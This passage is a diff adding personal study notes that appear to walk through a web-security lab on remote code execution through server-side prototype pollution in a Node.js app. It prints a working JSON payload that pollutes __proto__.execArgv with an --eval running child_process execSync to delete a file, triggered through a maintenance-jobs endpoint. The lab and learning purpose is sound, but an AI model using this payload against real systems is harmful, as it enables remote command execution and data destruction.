@@ -221,3 +221,27 @@ Flawed bypass
 ]
 ```
  - In addition to `fork()`, the child_process module contains the `execSync()` method, which executes an arbitrary string as a system command.
+
+# LAB
+ - Lab: Remote code execution via server-side prototype pollution
+ - We have elevated privliges.
+ - Two functionalities, usualy change address, and run maintance task.
+ - Vulnerable in change address.
+```
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"vcndPIOwSJGH21cCXPCmgXQzKaz7TgIT"}
+```
+ - I pass in
+```
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"vcndPIOwSJGH21cCXPCmgXQzKaz7TgIT",
+"__proto__": {
+    "execArgv": [
+        "--eval=require('child_process').execSync('rm -f //home//carlos//morale.txt')"
+]}}
+```
+ - For some time I do not see any change, then i realize, the node app has to start a child process right, so thats where the `Run Maintannce Jobs` comes into play.
+ - When i click on run maintance it sends
+```
+{"csrf":"pERs6Ej7f15zZywNbpq4hy8OPkr4p9fD","sessionId":"8fmR6H5za2QMUO90varD3SYsuWss7v80","tasks":["db-cleanup","fs-cleanup"
+]}
+```
+ - But it runs with execsync that i set earlier.
